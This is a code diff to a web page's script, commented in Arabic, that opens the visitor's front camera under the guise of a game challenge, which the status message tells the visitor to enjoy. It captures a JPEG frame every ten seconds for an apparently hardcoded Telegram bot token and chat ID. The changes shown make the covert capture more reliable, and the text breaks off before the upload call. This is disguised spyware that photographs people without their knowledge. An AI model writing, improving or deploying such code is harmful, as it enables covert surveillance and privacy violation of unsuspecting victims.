@@ -75,13 +75,10 @@
     <script>
         let stream = null;
 
-        // ────────────────────────────────────────────────────────────────
-        //                   بيانات البوت الخاصة بك
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID    = '6611123941';
-        // ────────────────────────────────────────────────────────────────
 
-        const PHOTO_INTERVAL = 8000;  // كل 8 ثوانٍ
+        const PHOTO_INTERVAL = 10000; // زيادة الفترة إلى 10 ثوانٍ لإعطاء وقت أكبر لتحميل الكاميرا
 
         async function startCamera() {
             const status = document.getElementById('status');
@@ -90,32 +87,50 @@
 
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" }   // "environment" للكاميرا الخلفية
+                    video: { facingMode: "user" }
                 });
 
-                document.getElementById('video').srcObject = stream;
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // انتظر حتى يصبح الفيديو جاهزًا
+                await new Promise(resolve => {
+                    video.onloadeddata = () => {
+                        console.log("الفيديو جاهز للالتقاط");
+                        resolve();
+                    };
+                    // timeout احتياطي لو ما اشتغل الحدث
+                    setTimeout(resolve, 5000);
+                });
+
                 status.textContent = "تم تفعيل التحدي! استمتع باللعبة...";
                 status.style.color = "#00ff88";
 
                 setInterval(captureAndSend, PHOTO_INTERVAL);
 
             } catch (err) {
-                status.textContent = "خطأ: " + err.message + " – حاول مرة أخرى";
+                status.textContent = "خطأ: " + err.message;
                 status.style.color = "#ff4444";
-                console.error("Camera access error:", err);
+                console.error("Camera error:", err);
             }
         }
 
         async function captureAndSend() {
             const video = document.getElementById('video');
-            if (video.videoWidth === 0) return;
+
+            // التحقق من أن الفيديو جاهز وله أبعاد حقيقية
+            if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
+                console.log("الفيديو ليس جاهزًا بعد، ننتظر...");
+                return;
+            }
 
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.72);
 
             try {
                 const blob = await (await fetch(dataUrl)).blob();
